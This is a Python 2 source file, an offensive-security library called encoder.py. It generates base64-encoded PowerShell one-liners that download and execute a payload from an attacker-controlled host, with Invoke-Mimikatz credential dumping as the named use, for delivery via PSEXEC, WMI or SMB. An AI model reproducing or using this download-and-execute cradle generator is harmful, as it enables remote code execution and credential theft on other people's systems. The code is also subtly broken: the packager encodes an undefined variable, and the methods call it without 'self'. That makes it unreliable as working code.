#!/usr/bin/env python

'''
Author: Christopher Duffy
Date: July 2015
Name: encoder.py
Purpose: To encode commands that execute PowerShell scripts, this library
has the necessary skeleton to have capabilities added as needed
Inputs: 
src_ip - The IP of the host executing the attack
src_port - The port the host his hosting either the downloadable script or service
dst_ip - Target to hit (not needed at this time)
dst_port - Target port to hit (not needed at this time)
payload - The randomized payload name that needs to be passed to generate a correct command
function - The capabilty you are trying to us (e.g. Invoke-Mimikatz), included for randomization
argument - The action to execute (e.g. DumpCreds), included for randomization
execution - The pregenerated command you want to execute
Output: The encoded command that can be passed by PSEXEC, WMI, SMB or copy and paste
Copyright (c) 2015, Christopher Duffy & William Butler All rights reserved.

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met: * Redistributions 
of source code must retain the above copyright notice, this list of conditions and 
the following disclaimer. * Redistributions in binary form must reproduce the above 
copyright notice, this list of conditions and the following disclaimer in the 
documentation and/or other materials provided with the distribution. * Neither the 
name of the nor the names of its contributors may be used to endorse or promote 
products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS 
"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, 
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE 
DISCLAIMED. IN NO EVENT SHALL CHRISTOPHER DUFFY & WILLIAM BUTLER BE LIABLE FOR ANY DIRECT, INDIRECT, 
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, 
PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT 
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE 
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'''

import base64,sys

class Obfiscator:
    def __init__(self, src_ip, src_port, dst_ip, dst_port, payload, function, argument, execution):
        self.src_ip = src_ip
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.src_port = src_port
        self.payload = payload
        self.function = function
        self.argument = argument
        self.execution = execution
        self.command = ""
        try:
            self.run()
        except Exception, e:
            print("[!] There was an error %s") % (str(e))
            sys.exit(1)

    def run(self):
        if "invoker" in self.execution:
            # Direct invoker
            self.invoker()
        elif "download" in self.execution:
            # Direct downloader
            self.downloader()

    def packager(self, cleartext):
        encoded_utf = text.encode('utf-16-le')
        encoded_base64 = base64.b64encode(encoded_utf)
        command = "powershell -nop -enc %s" % (encoded_base64)
        return(command)

    def invoker(self):
        # Invoke Mimikatz Directly
        # Creates the command iex (New-Object Net.WebClient).DownloadString('http://src_ip:src_port/payload'); function -argument
        text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (self.src_ip, self.src_port, self.payload, self.function, self.argument)
        self.command = packager(text)

    def downloader(self):
        # Download String Directly
        # Creates the command iex (New-Object Net.WebClient).DownloadString('http://src_ip:src_port/payload')
        text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s')" % (self.src_ip, self.src_port, self.payload)
        self.command = packager(text)

    def return_command(self):
        try:
            return(self.command)
        except Exception, e:
            print("[!] There was an error %s") % (str(e))
            sys.exit(1)
